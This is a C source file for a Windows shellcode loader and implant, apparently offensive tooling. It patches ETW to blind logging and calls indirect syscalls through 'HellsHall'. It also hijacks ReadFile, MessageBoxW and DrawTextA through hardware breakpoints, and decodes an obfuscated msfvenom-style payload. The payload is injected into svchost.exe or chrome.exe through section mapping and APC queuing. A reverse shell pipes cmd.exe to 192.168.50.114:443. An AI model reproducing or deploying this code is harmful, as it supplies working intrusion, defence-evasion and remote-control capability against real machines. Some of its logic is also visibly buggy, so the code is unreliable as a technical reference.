#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <winsock2.h>
#include <stdint.h>
#include <time.h>
#include <winuser.h>
#include "Sympho.h"
#include "HellsHall.h"
#pragma comment(lib, "ws2_32.lib")

// Global Variable :
NTSTATUS STATUS;
#define ViewShare 1
HANDLE hSection = NULL;
HANDLE hThread = NULL;
PBYTE pBaseSection = NULL;
DWORD PID = NULL;
HANDLE hProcess = NULL;
HANDLE hMap = NULL;
PBYTE   payload = NULL;
PVOID localBase = NULL;
PVOID remoteBase = NULL;
SIZE_T viewSize = NULL;
HANDLE hSnapshot = NULL;

typedef enum ETWfunc {
	vETWEventWrite,
	vETWEventWriteFull
};
// End of Global Variable



// HardwareBP variable :
VOID SetFunctionArgument(IN PCONTEXT pThreadCtx, IN ULONG_PTR uValue, IN DWORD dwParmIndex);
CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

#define CONTINUE_EXECUTION(CTX) (CTX->EFlags |= (1 << 16))

#define SETPARM_1(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x1))
#define SETPARM_2(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x2))
#define SETPARM_3(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x3))
#define SETPARM_4(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x4))
#define SETPARM_5(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x5))
#define SETPARM_6(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x6))
#define SETPARM_7(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x7))
#define SETPARM_8(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x8))
#define SETPARM_9(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x9))
#define SETPARM_A(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0xA))
#define SETPARM_B(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0xB))

#ifdef _WIN64
#define RETURN_VALUE(CTX, VALUE)((ULONG_PTR)CTX->Rax = (ULONG_PTR)VALUE)
#elif _WIN32
#define RETURN_VALUE(CTX, VALUE)((ULONG_PTR)CTX->Eax = (ULONG_PTR)VALUE)
#endif // _WIN64


#pragma section(".text")
__declspec(allocate(".text")) const unsigned char ucRet[] = { 0xC3 };

// Called in the detour function to block the execution of the original hooked function
VOID BLOCK_REAL(IN PCONTEXT pThreadCtx) {
#ifdef _WIN64
	pThreadCtx->Rip = (ULONG_PTR)&ucRet;
#elif _WIN32
	pThreadCtx->Eip = (DWORD)&ucRet;
#endif // _WIN64
}

// End of Hardware BreakPoint variable

enum DRX {
	DR0,
	DR1,
	DR2,
	DR3
};

enum DRX Dr0 = DR0;
enum DRX Dr1 = DR1;
enum DRX Dr2 = DR2;

typedef struct _MyStruct
{
	SysFunc NtMapViewOfSection;
	SysFunc NtCreateSection;
	SysFunc NtCreateThreadEx;
	SysFunc NtQueueApcThread;
	SysFunc NtQuerySystemInformation;
	SysFunc RtlAllocateHeap;
	SysFunc NtOpenProcess;
	SysFunc NtProtectVirtualMemory;
	SysFunc NtSuspendThread;
	SysFunc NtGetContextThread;
	SysFunc NtSetContextThread;
	SysFunc NtResumeThread;
} MyStruct, * PMyStruct;

MyStruct S = { 0 };
PSYSTEM_PROCESS_INFORMATION sProcInfo = NULL;


BOOL Initialize() {

	RtlSecureZeroMemory(&S, sizeof(MyStruct));

	if (!InitilizeSysFunc("NtQuerySystemInformation")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtQuerySystemInformation);

	if (!InitilizeSysFunc("NtMapViewOfSection")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtMapViewOfSection);

	if (!InitilizeSysFunc("NtCreateSection")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtCreateSection);

	if (!InitilizeSysFunc("NtCreateThreadEx")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtCreateThreadEx);

	if (!InitilizeSysFunc("NtQueueApcThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtQueueApcThread);

	if (!InitilizeSysFunc("RtlAllocateHeap")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.RtlAllocateHeap);

	if (!InitilizeSysFunc("NtOpenProcess")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtOpenProcess);

	if (!InitilizeSysFunc("NtSuspendThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtSuspendThread);

	if (!InitilizeSysFunc("NtGetContextThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtGetContextThread);

	if (!InitilizeSysFunc("NtSetContextThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtSetContextThread);

	if (!InitilizeSysFunc("NtResumeThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtResumeThread);

	if (!InitilizeSysFunc("NtProtectVirtualMemory")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtProtectVirtualMemory);

	return TRUE;
}
#define RET_OPCODE 0xC3
#define MOVE_EAX_imm32_OPCODE 0xB8

BOOL RemoveETWEvent(HMODULE hModule) {
	DWORD dwOldProtection = 0;

	printf("\t[i] Shuting Down ETW provision\n");
	PBYTE pNtTraceEvent = (PBYTE)GetProcAddress(hModule, "NtTraceEvent");
	if (!pNtTraceEvent)
		return FALSE;

	for (int i = 0; i < 0x20; i++) {
		if (pNtTraceEvent[i] == MOVE_EAX_imm32_OPCODE) {
			pNtTraceEvent = &pNtTraceEvent[i + 1];
			break;
		}
		if (pNtTraceEvent[i] == RET_OPCODE || pNtTraceEvent[i] == 0x0F || pNtTraceEvent[i] == 0x05)
			return FALSE;
	}

	void* pvoidNtTraceEvent = (void*)pNtTraceEvent;
	UINT sizet = sizeof(DWORD);

	SYSCALL(S.NtProtectVirtualMemory);
	if (!VirtualProtect(pNtTraceEvent, sizet, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect failed with error %d\n", GetLastError());
		return FALSE;
	}

	*(PDWORD)pNtTraceEvent = 0x000000FF; // Patch

	// Reset perms
	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect failed with error %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE\n");
	return TRUE;
}


HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
	PSYSTEM_PROCESS_INFORMATION entry = sProcInfo;
	HANDLE hPID = NULL;
	NTSTATUS status;
	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	while (entry->NextEntryOffset) {
		if (entry->ImageName.Buffer &&
			wcscmp(entry->ImageName.Buffer, ProcessName) == 0) {

			int localPID = (int)(ULONG_PTR)entry->UniqueProcessId;
			CLIENT_ID clientId = {
				.UniqueProcess = (HANDLE)(ULONG_PTR)localPID,
				.UniqueThread = NULL
			};

			const ACCESS_MASK desired = PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION;

			SYSCALL(S.NtOpenProcess);
			status = HellHall(&hPID, desired, &objAttr, &clientId);


			if (status == STATUS_SUCCESS && hPID) {
				*PID = localPID;
				printf("[+] Opened \"%ls\" PID=%d, handle=%p\n",
					ProcessName, *PID, hPID);
				return hPID;
			}
		}

		entry = (PSYSTEM_PROCESS_INFORMATION)
			((BYTE*)entry + entry->NextEntryOffset);
	}
	return NULL;
}


void reverse_shell(const char* ip, int port) {
	printf("[+] Getting reverse shell...\n");

	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) { printf("Socket fail\n"); return; }

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(ip);

	if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		printf("Connect failed: %d\n", WSAGetLastError());
		closesocket(s);
		return;
	}

	printf("[+] Connected!\n");

	char buffer[1024];
	DWORD bytesRead, bytesWritten;

	// create pipe for cmd.exe
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	HANDLE hStdInRead, hStdInWrite;
	HANDLE hStdOutRead, hStdOutWrite;
	if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) return;
	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) return;

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = hStdInRead;
	si.hStdOutput = hStdOutWrite;
	si.hStdError = hStdOutWrite;

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE,
		CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		printf("CreateProcess failed\n");
		return;
	}

	CloseHandle(hStdInRead);
	CloseHandle(hStdOutWrite);
	DWORD bytesAvailable = 0;

	while (1) {
		// Read stdout from cmd.exe
		DWORD bytesAvailable = 0;
		if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) {
			DWORD bytesRead;
			ReadFile(hStdOutRead, buffer, min(bytesAvailable, sizeof(buffer) - 1), &bytesRead, NULL);
			send(s, buffer, bytesRead, 0);
		}

		// Read commands from C2
		int len = recv(s, buffer, sizeof(buffer) - 1, 0);
		if (len > 0) {
			buffer[len] = 0;
			buffer[len] = '\n';
			WriteFile(hStdInWrite, buffer, len + 1, &bytesWritten, NULL);
		}
		else if (len == 0) {
			break; // connexion fermée
		}

		Sleep(50); // éviter CPU à 100%
	}

	CloseHandle(hStdInWrite);
	CloseHandle(hStdOutRead);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	closesocket(s);
	WSACleanup();
}

// Decode shellcode for remote APC injection: 
#define ROTR8(x,n)  ((BYTE) ( ((UINT8)(x) >> (n)) | ((UINT8)(x) << (8 - (n))) ) & 0xFF)
#define XOR_VALUE    0xA5
#define SHUFFLE_ORDER

BOOL AlphabaticalShellcodeDecode(IN PWORD pEncodedShellcode, IN DWORD dwEncodedShellcodeSize, OUT PBYTE* ppDecodedShellcode, OUT PDWORD pdwDecodedShellcodeSize) {

	if (!pEncodedShellcode || dwEncodedShellcodeSize == 0 || !ppDecodedShellcode || !pdwDecodedShellcodeSize) return FALSE;
	if (dwEncodedShellcodeSize > (SIZE_MAX / sizeof(WORD))) return FALSE;

	*pdwDecodedShellcodeSize = dwEncodedShellcodeSize / sizeof(WORD);

	if (!(*ppDecodedShellcode = (PBYTE)LocalAlloc(LPTR, *pdwDecodedShellcodeSize))) return FALSE;

	for (DWORD i = 0; i < dwEncodedShellcodeSize / sizeof(WORD); i++)
	{
		BYTE    bOffset = 0x00,
			bTransformed = 0x00,
			bEncoded = 0x00;

		bTransformed = (BYTE)(pEncodedShellcode[i] & 0xFF);
		bOffset = (BYTE)(pEncodedShellcode[i] >> 8);
		bEncoded = ROTR8((bTransformed ^ XOR_VALUE), 4);

		(*ppDecodedShellcode)[i] = bEncoded - bOffset;
	}


#ifdef SHUFFLE_ORDER

	DWORD   dwRoundedDownSize = *pdwDecodedShellcodeSize & ~0x3;
	DWORD   dwTotalDwords = dwRoundedDownSize / sizeof(DWORD);
	PDWORD  pdwRawHexShellcode = (PDWORD)(*ppDecodedShellcode);

	for (DWORD i = 0; i < dwTotalDwords; i++)
	{
		pdwRawHexShellcode[i] = (((pdwRawHexShellcode[i] << 16) | (pdwRawHexShellcode[i] >> 16)) & 0xFFFFFFFFu);
	}

#endif 


	return TRUE;
}

// End of decode functions for shellcode

BOOL SettingMap(HANDLE* outSection, PBYTE* outRemoteBase, HANDLE hProcess) {

	printf("\t[i] ReadFile hooked successfuly\n");
	DWORD   dwDecodedpayloadLen = 0x00;
	// Put your msfvenom shellcode encoded here !
	unsigned char EncodedShellcode[] = "hYgHpanteLclpmpuoklKclcllJnkoklLbKgZOXNvhQnjNYntiALLoLmDjqlJmtMFjqkzcLlTpNjElLodnolkMDNtbKeLdSntikNBdprAmlokbzlppPmKgkgcfZQbckeKnkntoZokmlkajqizlTSnlZopiLZwfljqaLntclclhhnUjwgldLlLntckmtmHiAodmlNujqolaiIxSnflgcmKmDcmjtOfiAmXnolkaKQylkgldSntgktTjPokckeKpPmKkwplotalMBbXMBcilcdKbtlWitmHhgatbXNujqMNOHokckflodnxhQRsRcocxRolmKzraKfllTckbxhTYwokdLmKncLDlDoNokOUmKitMFjyoklBmKoZwAcLlDokcmalntxRLEoRoUcmpKfSoOodcmSpclaLtcckaLclaLaLhOIAaLntclaLckckbKhQokTeCoGYhmkedgjZgqfLeRjVoVokHAcmKYgoxZghvhntcfNBcDmPStalpSklgqlUiWcgnMoBcYkzokIEclisawnLaraMhwiZnMkuigOBkynTloMKhpmlXroKnMhocLcJnNhxnFhmnsYabOoUnQnWLLxxIiOLnWiYnKiWbOiwnHMnCNluiZhsiXhlnTiXlmlkmRbMlnbKlcmZlnmWovmTbKbKbLlnigktbHlmnMnShlNROLnSiXbNcLlohnbUkxOhnmhgnWcLOEyakthlcEnWiciXOBhmXvnNBPykbUbZaL";

	if (!AlphabaticalShellcodeDecode(EncodedShellcode, sizeof(EncodedShellcode) - 1, &payload, &dwDecodedpayloadLen))
	{
		return -1;
	}
	if (memcmp(payload, payload, dwDecodedpayloadLen) != 0)
	{
		printf("[!] Error while decoding Shellcode\n");
	}
	else
	{
		printf("[+] Success: Decoded Shellcode successfuly\n");
		
	}
	



	SIZE_T sPayload = dwDecodedpayloadLen;
	LARGE_INTEGER maxSize = { .HighPart = 0, .LowPart = sPayload };
	SYSCALL(S.NtCreateSection);
	if ((STATUS = HellHall(&hMap, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] Issue creating the section\n");
		return FALSE;
	}
	printf("[+] Section created\n");
	SYSCALL(S.NtMapViewOfSection);
	if ((STATUS = HellHall(hMap, GetCurrentProcess(), &localBase, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("NtMapViewOfSection failed with status: 0x%X\n", STATUS);
		return FALSE;
	}
	else {
		printf("\t[i] NtmapViewofsection mapped locally\n");
	}

	if (hMap != NULL) {
		*outSection = hMap;
	}
	else {
		printf("[-] Failed to create the map\n");
	}

	if (localBase == NULL) {
		printf("[!] Failed to map the view\n");
		return FALSE;
	}

	memcpy(localBase, payload, dwDecodedpayloadLen);
	viewSize = sPayload;
	if ((STATUS = HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY)) != 0) {
		printf("[-] Issue while mapping view remotely. NTSTATUS: 0x%08X\n", STATUS);
		return FALSE;
	}
	else {
		printf("[+] File Mapped succesfuly with remote process at 0x%p\n", remoteBase);
		*outRemoteBase = remoteBase;
	}
	Sleep(100);
	HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_WRITECOPY);
	printf("[+] Remote protection set ok\n");
	return TRUE;
}




/*
Set Hardware BP
*/

uint64_t SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, uint64_t NewBitValue) {
	uint64_t mask = (1UL << NmbrOfBitsToModify) - 1UL;
	uint64_t NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);

	return NewDr7Register;
}

BOOL SetHardwareBreakingPnt(IN PVOID pAddress, IN PVOID fnHookFunc, IN enum DRX Drx) {

	if (!pAddress || !fnHookFunc)
		return FALSE;

	// Get local thread context
	if (!GetThreadContext((HANDLE)-2, &ThreadCtx)) // -2 for local thread
		return FALSE;

	// Sets the value of the Dr0-3 registers 
	switch (Drx) {
	case DR0: {
		if (!ThreadCtx.Dr0)
			ThreadCtx.Dr0 = pAddress;
		break;
	}
	case DR1: {
		if (!ThreadCtx.Dr1)
			ThreadCtx.Dr1 = pAddress;
		break;
	}
	case DR2: {
		if (!ThreadCtx.Dr2)
			ThreadCtx.Dr2 = pAddress;
		break;
	}
	case DR3: {
		if (!ThreadCtx.Dr3)
			ThreadCtx.Dr3 = pAddress;
		break;
	}
	default:
		return FALSE;
	}

	// enabling Breakpoints
	// SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue);=
	ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, (Drx * 2), 1, 1);

	// Set the thread context
	if (!SetThreadContext((HANDLE)-2, &ThreadCtx))
		return FALSE;

	return TRUE;
}



BOOL RemoveHardwareBreakingPnt(IN enum DRX Drx) {

	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	if (!GetThreadContext((HANDLE)-2, &ThreadCtx))
		return FALSE;

	// Remove the address of the hooked function from the thread context
	switch (Drx) {
	case DR0: {
		ThreadCtx.Dr0 = 0x00;
		break;
	}
	case DR1: {
		ThreadCtx.Dr1 = 0x00;
		break;
	}
	case DR2: {
		ThreadCtx.Dr2 = 0x00;
		break;
	}
	case DR3: {
		ThreadCtx.Dr3 = 0x00;
		break;
	}
	default:
		return FALSE;
	}

	// Disabling the hardware breakpoint by setting the target G0-3 flag to zero 
	ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, (Drx * 2), 1, 0);

	if (!SetThreadContext((HANDLE)-2, &ThreadCtx))
		return FALSE;

	return TRUE;
}




// VEH Function
LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
		PVOID exceptionAddress = pExceptionInfo->ExceptionRecord->ExceptionAddress;
		PCONTEXT ctx = pExceptionInfo->ContextRecord;
		enum DRX triggered = -1;

		if (exceptionAddress == (PVOID)ctx->Dr0) triggered = DR0;
		else if (exceptionAddress == (PVOID)ctx->Dr1) triggered = DR1;
		else if (exceptionAddress == (PVOID)ctx->Dr2) triggered = DR2;
		else if (exceptionAddress == (PVOID)ctx->Dr3) triggered = DR3;

		if (triggered >= DR0 && triggered <= DR2) {

			RemoveHardwareBreakingPnt(triggered);

			switch (triggered) {
			case DR0:
				//-----------------------------
				// Mapping of section
				//-----------------------------
				// RCX = &hSection
				// RDX = &pBaseSection
				// R8  = hProcess
				ctx->Rcx = (ULONG_PTR)&hSection;
				ctx->Rdx = (ULONG_PTR)pBaseSection;
				ctx->R8 = (ULONG_PTR)hProcess;

				if (!SettingMap(&hSection, &pBaseSection, hProcess))
					RETURN_VALUE(ctx, FALSE);
				else
					RETURN_VALUE(ctx, TRUE);
				break;

			case DR1:
				//-----------------------------
				// Queue APC on alertable thread
				//-----------------------------
				// RCX = PID
				// RDX = pBaseSection
				ctx->Rcx = (ULONG_PTR)PID;
				ctx->Rdx = (ULONG_PTR)pBaseSection;
				if (!QueueShellcodeAPC((DWORD)PID, pBaseSection))
					RETURN_VALUE(ctx, FALSE);
				else
					RETURN_VALUE(ctx, TRUE);
				break;

			case DR2:
				//-----------------------------
				// Manual injection via SleepEx APC
				//-----------------------------
				// RCX = hProcess
				// RDX = pBaseSection
				ctx->Rcx = (ULONG_PTR)hProcess;
				ctx->Rdx = (ULONG_PTR)pBaseSection;
				if (!InjectShellcodeAPCmanually(hProcess, pBaseSection))
					RETURN_VALUE(ctx, FALSE);
				else
					RETURN_VALUE(ctx, TRUE);
				break;
			}

			// Bypass Hooked function
			BLOCK_REAL(ctx);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

int randint(int min, int max) {
	return min + rand() % (max - min + 1);
}

void WaitExec() {
	srand((unsigned int)time(NULL));
	int ready = 0;
	while (!ready) {
		int r = randint(0, 100);
		if (r >= 90) {
			ready = 1;
		}
		Sleep(500);
	}
	printf("[+] Executing the reverse shell...\n");
	((void(*)())reverse_shell)("192.168.50.114", 443); // Add your IP and Port for reverse shell if remote APC injection doesn't execute itself
}

volatile BOOL executed = FALSE;
BOOL* pExecuted;
VOID CALLBACK DummyAPCFunc(ULONG_PTR param) {
	pExecuted = (BOOL*)param;
	*pExecuted = TRUE;
}


BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {

	printf("\t[i] MessageBoxW hooked successfuly\n");
	int i = 0;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPID);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Snapshot failed.\n");
		return FALSE;
	}

	THREADENTRY32 te32 = { 0 };
	te32.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hSnapshot, &te32)) {
		CloseHandle(hSnapshot);
		return FALSE;
	}
	do {
		if (te32.th32OwnerProcessID == dwPID) {
			hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
			if (hThread) {
				// Trying the injection
				DWORD res = QueueUserAPC((PAPCFUNC)pRemoteShellcode, hThread, (ULONG_PTR)NULL);
				if (res != 0) {
					printf("[+] APC queued on thread %lu\n", te32.th32ThreadID);
					break;
				}

			}
		}
	} while (Thread32Next(hSnapshot, &te32));
	int x = 0;
	if (i == 0) {
		return FALSE;
	}
	do {
		Sleep(100);
		if (executed) {
			printf("[+] DummyAPCFunc executed successfully.\n");
			CloseHandle(hSnapshot);
			return TRUE;
		}
		else if (x == 9) {
			printf("[-] DummyAPCFunc was not executed.\n");
			return FALSE;
		}
		else {
			x++;
		}
	} while (x < 10);

	CloseHandle(hSnapshot);
	return TRUE;
}

void MySleepEx() {
	SleepEx(1000, TRUE);
}

void MySleepThread() {
	while (1) {
		SleepEx(INFINITE, TRUE); // alertable sleep
	}
}



BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
	HANDLE hLocalTread = NULL;
	ULONG PreviousSuspendCount;
	SYSCALL(S.NtCreateThreadEx);
	if ((STATUS = (HellHall(&hLocalTread, THREAD_ALL_ACCESS, 0, (HANDLE)-1, MySleepThread, 0, 0x00000001, 0, 0, 0, 0))) != 0) {
		printf("[-] failed to create local thread\n");
	}

	BOOL res = QueueUserAPC((PAPCFUNC)WaitExec, hLocalTread, (ULONG_PTR)NULL);
	if (res != 0) {
		printf("[+] APC queued on newly created thread id : %d\n", GetThreadId(hLocalTread));
	}
	else {
		printf("Error\n");
		return(FALSE);
	}
	SYSCALL(S.NtResumeThread);
	if ((STATUS = (HellHall(hLocalTread, &PreviousSuspendCount))) != 0) {
		printf("Error while resuming newly thread\n");
		return(FALSE);
	}

	return TRUE;
}



int main() {
	uint64_t expectedHash = 0x9B90848C8B008677; // NTDLL.DLL
	HMODULE hModule = GiveMeMyModule(expectedHash);

	if (!RemoveETWEvent(hModule)) {
		printf("[-] Error while patching ETW functions\n");
		exit(0);
	}

	AddVectoredExceptionHandler(1, VectorHandler);


	if (!hModule) {
		printf("Error Getting NTDLL\n");
		return -1;
	}
	else {
		printf("[+] found NTDLL\n");
	}

	if (!Initialize()) {
		printf("bad Initialization\n");
		return -1;
	}

	// Remove ETW 


	ULONG sProcInfoL = 0;

	/*
	Set Hardware BP
	*/
	if (!SetHardwareBreakingPnt(ReadFile, SettingMap, Dr0) || !SetHardwareBreakingPnt(MessageBoxW, QueueShellcodeAPC, Dr1) || !SetHardwareBreakingPnt(DrawTextA, InjectShellcodeAPCmanually, Dr2)) {
		printf("Error while Initializing HardwareBP\n");
		exit(-1);
	}


	// Get system information (process list)
	SYSCALL(S.NtQuerySystemInformation);
	if ((STATUS = HellHall(SystemProcessInformation, NULL, 0, &sProcInfoL)) != 0x0 && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
		printf("[!] NtQuerySystemInformation failed with status : 0x%0.8X\n", STATUS);
		return -1;
	}

	if (STATUS == STATUS_INFO_LENGTH_MISMATCH) {
		sProcInfoL *= 2;
	}

	// Allocate memory for process information
	sProcInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(sProcInfoL);
	if (!sProcInfo) {
		printf("[!] Memory allocation failed\n");
		return -1;
	}

	// Query system info again
	if ((STATUS = HellHall(SystemProcessInformation, sProcInfo, sProcInfoL, NULL)) != 0x0) {
		printf("[!] NtQuerySystemInformation failed with status : 0x%0.8X\n", STATUS);
		free(sProcInfo);
		return -1;
	}

	// Try to open svchost.exe first
	hProcess = GiveMeMyProcessHandle(L"svchost.exe", &PID);
	if (hProcess == NULL) {
		// If not found, try to open chrome.exe
		printf("[!] No openable chrome.exe found. Trying chrome.exe...\n");
		hProcess = GiveMeMyProcessHandle(L"chrome.exe", &PID);
	}

	if (hProcess == NULL) {
		printf("[!] No openable svchost.exe or chrome.exe process found.\n");
		free(sProcInfo);
		return -1;
	}

	ReadFile(NULL, "Thanks !", "HIHI", MB_OK, NULL);
	if (pBaseSection != NULL && pBaseSection != 0) {
		
		printf("[+] Setup of the map successful at 0x%p\n", pBaseSection);
	}
	else {
		printf("Failed to create map\n");
		printf("%p, %d", pBaseSection, *pBaseSection);
	}
	// Getting a thread from the remote process
	printf("\t[i] Executing the shellcode localy\n");
	if (!MessageBoxW(NULL, L"test", "Never exec", MB_OK)) { // QueueShellcodeAPC((DWORD)PID, pBaseSection)
		printf("\t[i] Trying to inject a thread manually\n");
		RECT rc = { 10, 10, 200, 50 };
		HDC hdc = NULL;
		if (!DrawTextA(hdc, "Hello World", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE)) { // !InjectShellcodeAPCmanually(hProcess, pBaseSection)
			printf("Failed to inject local thread manually\n");
		}
		else {
			printf("\nEnjoy :)\n\n");
			getchar();
		}
	}
	else {
		printf("\nEnjoy :)\n\n");
	}


}
